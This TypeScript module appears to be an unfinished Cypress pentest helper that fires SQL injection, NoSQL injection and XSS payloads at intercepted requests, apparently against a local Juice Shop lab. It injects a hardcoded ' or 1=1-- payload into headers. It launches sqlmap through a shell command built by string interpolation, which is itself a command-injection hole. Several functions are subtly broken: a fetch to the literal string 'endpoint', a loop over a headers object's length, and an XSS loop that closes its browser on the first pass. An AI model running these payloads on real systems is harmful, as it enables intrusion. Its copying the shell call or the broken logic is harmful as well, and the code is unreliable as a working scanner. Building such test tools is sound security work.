/// <reference path="./index.d.ts" />


import fs from 'fs'
import process from 'process'
import os from 'os'
import fetch from 'node-fetch'
import {spawn} from "node:child_process"
import * as path from 'path';
import {sendGETRequest, sendPOSTRequest} from "./utils/requests";
import * as Puppeteer from 'puppeteer';
import {log} from "./utils/log";
import {Interception} from "cypress/types/net-stubbing";
// declare variables for http status codes
const HTTP_SUCCESS = Array.from({ length: 100 }, (_, index) => index + 200);
const HTTP_REDIRECT = Array.from({ length: 100 }, (_, index) => index + 300);
const HTTP_ERROR = Array.from({ length: 100 }, (_, index) => index + 400);
const HTTP_SERVER_ERROR = Array.from({ length: 100 }, (_, index) => index + 500);
// declare variables for paths
const baseDir = process.cwd();
const logsPath = path.join(baseDir, 'logs', 'cypress.log');
const payloadPath = path.join(baseDir, 'lists', 'sqli.txt');
const nosqlPayloadsPath = path.join(baseDir, 'lists', 'nosql');
const secondOrderLogs = path.join(baseDir, 'logs', 'test.log');

// const Cypress = require('cypress'); // might be false
/**
 * function that checks a specific endpoint for sql injection.
 * @module cypress-pentest-baseline
 * @param request: Is the intercepted request
 * @param injectable: The parameter that is injectable
 */
// TODO: add correct return type || Only one payload parameter per request?
// TODO: Implement enum for sql injection type: boolean, union, nosql, etc.
export async function checkEndpoint(request: any, injectable: any)
{
    const req = request.request
    const newRequestString = JSON.stringify(req, null, 2)
    // Logging since console.log does not work
    const newLog = `-------------------------------------\n Intercepted Request: ${newRequestString}\n`
    log(logsPath, newLog)
    let payloads: string[] = []
    if (fs.existsSync(payloadPath)) {
        const fileContent = fs.readFileSync(payloadPath, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error. Cannot find payloads list: ${payloadPath}`)
    }
    // create the requests with the post Parameters declared in the test file
    log(logsPath, `Method: ${req.method}\n`)
    log(logsPath, `Request Endpoint: ${req.url}\n`)
    for (let i = 0; i < payloads.length; i++) {
        // request parameters provided by the function call, e.g. username, password
        /**
        const reqParameters: object = {}
        postParams.forEach(function (param: string) {
            reqParameters[param] = payloads[i]
        })
        // assign the request parameters to the request body and header
        // TODO: outsource
        req.body = reqParameters
         **/
        // req.body[`${injectable}`] = payloads[i]
        req.body = {
            ...req.body,
            [injectable]: payloads[i],
        }
        const body = JSON.stringify(req.body)
        const header = JSON.stringify(req.headers)
        req.headers['content-length'] = body.length.toString()
        // send the request and wait for the response
        const response = await fetch(req.url, {
            method: req.method,
            body: '' + body,
            headers: req.headers
        })
        const data = await response.text()
        // log and print the response for debugging purposes
        if (HTTP_SUCCESS.includes(response.status)) {
            log(logsPath, `Loop iteration: ${i}\n`)
            log(logsPath, `Header of Request: ${header}\n`)
            log(logsPath, `Body of Request: ${body}\n`)
            log(logsPath, `Content length of new body: ${body.length.toString()}\n`)
            log(logsPath, `Response data: ${JSON.stringify(data, null, 2)}\n`)
            log(logsPath, `Response Status: ${JSON.stringify(response.status)}\n`)
            log(logsPath, `Response Text: ${JSON.stringify(response.statusText)}\n`)
            log(logsPath, '------------------------------------------------------\n')

        }
    }
    return null
}
/**
 * function that provides a sqlmap child process inside cypress. Parameters are inside a json object bc of cypress.
 * @param route: url to test
 * @param args: array of arguments for sqlmap, e.g. --dbs --level=3 --risk=3 --batch
 */
export async function sqlMap ( route, args ) {
    return await new Promise((resolve, reject) => {
        const homeDir = os.homedir()
        // clone the repo to the home directory before calling this function - otherwise it will fail
        const filePath = path.join(homeDir, 'sqlmap-dev', 'sqlmap.py')
        log(logsPath, '...starting SQL map...\n')
        if (args === '') {
            args = ['-h']
        }
        try {
            log(logsPath, `python3 ${filePath}  -u ${route}`)
            const child = spawn(`python3 ${filePath}  -u ${route}`, args, { shell: true }).on('error', function (err) { throw err })
            child.stdout.on('data', (data) => {
                log(logsPath, `sqlmap-data: ${data}\n`)
                // child.kill() // not sure if these are necessary
                // resolve(false)
            })
            child.on('exit', (code, signal) => {
                log(logsPath, `Child process exited with code ${code} and signal ${signal}\n`)
                child.kill()
                resolve(false)
            })
        } catch (e) {
            log(logsPath, `Error Message from Spawn: ${e}\n`)
            reject(e)
        }
    })
}

/**
 * spawnShell - DEPRECATED: use function sqlMap instead.
 * @param command: shell command to execute
 * @param args: arguments for the shell command
 */
export async function spawnShell ({ command, args }) {
    return await new Promise((resolve, reject) => {
        console.log(args)
        try {
            const child = spawn(command, args, { shell: true }).on('error', function (err) { throw err })
            child.stdout.on('data', (data) => {
                log(baseDir + '\\logs\\cypress.log', `DATA EVENT LISTENER ${data}\n`)
                child.kill()
                resolve(false)
            })
            child.on('exit', (code, signal) => {
                log(baseDir + '\\logs\\cypress.log', `Child process exited with code ${code} and signal ${signal}\n`)
                child.kill()
                resolve(false)
            })
        } catch (e) {
            log(baseDir + '\\logs\\cypress.log', `Error Message from Spawn: ${e}\n`)
            reject(e)
        }
    })
}

/**
 * Tests SQLi using the header of a request
 * @param request: Intercepted request
 * @param headers: The fields in the header where payload shall be injected.
 */
// TODO: Implement payload list for header sql injection
export async function headerSQLi ({ request, headers }) {
    const endpoint = 'http://localhost:3000/rest/user/login'
    const req = request.request
    const body = JSON.stringify(req.body)
    for (let i = 0; i < req.headers.length; i++) {
        req.headers[`${headers[i]}`] = '\' or 1=1--'
    }
    // req.headers.cookie = 'this is a test'
    // req.headers['x-forwarded-for'] = '123.123.123.123'
    const reqJson = JSON.stringify(req, null, 2)
    const logMessage = `\n Request with new cookie: ${reqJson}\n`
    const pathToLog = baseDir + '\\logs\\sqli.log'
    log(pathToLog, logMessage)
    const response = await fetch(endpoint, {
        method: 'POST',
        body: '' + body,
        headers: req.headers
    })
    const data = await response.text()
    log(pathToLog, `Header of Request: ${JSON.stringify(req.headers)}\n`)
    log(pathToLog, `Response data: ${JSON.stringify(data)}\n`)
    log(pathToLog, `Response Status: ${JSON.stringify(response.status)}\n`)
    return null
}

/**
 * Tests for second order SQLi
 * @param request: the intercepted request
 */
export async function secondOrderAttack (request: any) {
    log(secondOrderLogs, baseDir)

    const endpoint = 'http://localhost:3000/api/Users/'
    const pathToLog = baseDir + '\\logs\\sqli.log'
    log(pathToLog, '++++++++++++++++++++++++++ Second Order SQL Injection ++++++++++++++++++++++++++\n')
    const req = request.request // request-structure depending on api?
    const reqStringified = JSON.stringify(req, null, 2)
    const loggedMessage = `\n ++++Intercepted Request: ++++\n ${reqStringified}\n`
    log(pathToLog, loggedMessage)
    // req.body.email = 'admin@juice-sh.op\'--'
    req.request.body.email = 'baran_advisori@test.com'
    const body = JSON.stringify(req.request.body)
    const response = await fetch(endpoint, {
        method: 'POST',
        body: '' + body,
        headers: req.headers
    })
    const reqJSON = JSON.stringify(req, null, 2)
    const logMessage = `\n ++++Request with new username: ++++\n${reqJSON}\n`
    log(pathToLog, logMessage)
    const data = await response.text()
    log(pathToLog, `Response data: ${JSON.stringify(data, null, 2)}\n`)
    log(pathToLog, `Response Status: ${JSON.stringify(response.status)}\n`)
    return null
}

/**
 * Checks endpoint for noSQL-injection
 * @param request: the intercepted request
 */
export async function noSQLiCheck (request) {
    const req = request
    let payloads = []
    if (fs.existsSync(nosqlPayloadsPath)) {
        const fileContent = fs.readFileSync(nosqlPayloadsPath, 'utf-8')
        payloads = fileContent.split('\n')
        // fs.appendFileSync(path, `Payloads:\n ${payloads}`)
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error! File does not exist: ${payloadPath}`)
    }
    for (let i = 0; i < payloads.length; i++) {
        req.request.body = {
            email: payloads[i],
            password: payloads[i]
        }
        const body = JSON.stringify(req.request.body)
        const header = JSON.stringify(req.request.headers)
        req.request.headers['content-length'] = body.length.toString()
        const response = await fetch('endpoint', {
            method: 'POST',
            body: '' + body,
            headers: req.request.headers
        })
        const res = await response.text()
        if (HTTP_SUCCESS.includes(response.status)) {
            // Logging for debugging purposes.
            log(logsPath, `Loop iteration: ${i}\n`)
            log(logsPath, `Header of Request: ${header}\n`)
            log(logsPath, `Body of Request: ${body}\n`)
            log(logsPath, `Content length of new body: ${body.length.toString()}\n`)
            log(logsPath, `Response data: ${JSON.stringify(res, null, 2)}\n`)
            log(logsPath, `Response Status: ${JSON.stringify(response.status)}\n`)
            log(logsPath, `Response Text: ${JSON.stringify(response.statusText)}\n`)
            log(logsPath, '------------------------------------------------------\n')
        }
    }
    return null
}

/**
 * Function that analyzes the flags of the HTTP header regarding security
 * @param request
 */
export async function checkHeaderFlags(request: Interception){

    return null
}

/**
 * function that conducts a crlf injection by inserting several newline characters into the request
 * @param request: the intercepted request
 */
export async function crlfInjection(request: Interception){

    return null
}

/**
 * function that checks a component for XSS vulnerabilities
 * @param request: the intercepted request that is used to alter the input
 */
// TODO: find way to check DOM for alert
export async function reflectedXSS(request: Interception){
    const dir = path.join(baseDir, 'lists', 'xss');
    const logDir = path.join(baseDir, 'logs', 'xss.log');
    const req = request.request
    let payloads: string[] = []
    if (fs.existsSync(dir)) {
        const fileContent = fs.readFileSync(dir, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error. Cannot find payloads list: ${payloadPath}`)
    }
    const method = req.method; // does this work?
    const endpoint = req.url;

    // build query string: ?param1=value1&param2=value2
    log(logDir, `Request: ${req}\n`)
    log(logDir, `Request Method: ${method}\n`)
    log(logDir, `Loop Endpoint: ${endpoint}\n`)
    for( let i = 0; i < payloads.length;i++){
        let payload = `?id=${payloads[i]}`;
        const response = await fetch(endpoint + payload, {
            method: method,
            headers: req.headers.toString()
        })
        const data = await response.text()

    }
    if (method === 'GET') {
        const queryParams = {
            x: 'test',
            y: ''
        }
        log(logDir, `Request Method: ${method}\n`)
        const x = new URLSearchParams(queryParams).toString;
        // const response = sendGETRequest('', endpoint)
        return null;
    } else if (method === 'POST') {
        // const response = sendPOSTRequest(req.body, req.headers, endpoint)
        return null;
    }
    return null
}
export async function altXSS(request: Interception) {
    // another approach for reflected XSS.
    const browser = await Puppeteer.launch({ headless: true, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()
    const req = request.request

    const dir = path.join(baseDir, 'lists', 'xss');
    const logDir = path.join(baseDir, 'logs', 'xss.log');

    let payloads: string[] = []
    if (fs.existsSync(dir)) {
        const fileContent = fs.readFileSync(dir, 'utf-8')
        payloads = fileContent.split('\n')
    } else {
        console.error('File does not exist:', logsPath)
        log(logsPath, `Error. Cannot find payloads list: ${dir}`)
    }
    for(let i = 0; i < payloads.length;i++){
        const payload = req.url + payloads[i];
        // GET -> ?id=1 value von parameter ersetzen!
        let is_vulnerable = false
        console.log(i)

        page.on("dialog", dialog =>{
            is_vulnerable = true
            dialog.accept()
        })

        await page.goto(payload)

        await browser.close()
        if(is_vulnerable){
            return -1;
        }else{
            return 0;
        }
    }
}
export async function storedXSS(request: Interception){
    // const dir = path.join(baseDir, 'lists', 'xss');
    const logDir = path.join(baseDir, 'logs', 'xss.log');
    log(logDir, "stored XSS testing underway...\n");
    const req = request.request
    const newRequestString = JSON.stringify(req, null, 2)
    // Logging since console.log does not work
    const newLog = `\n Intercepted Request: ${newRequestString}\n`
    log(logsPath, newLog)



    return true;
}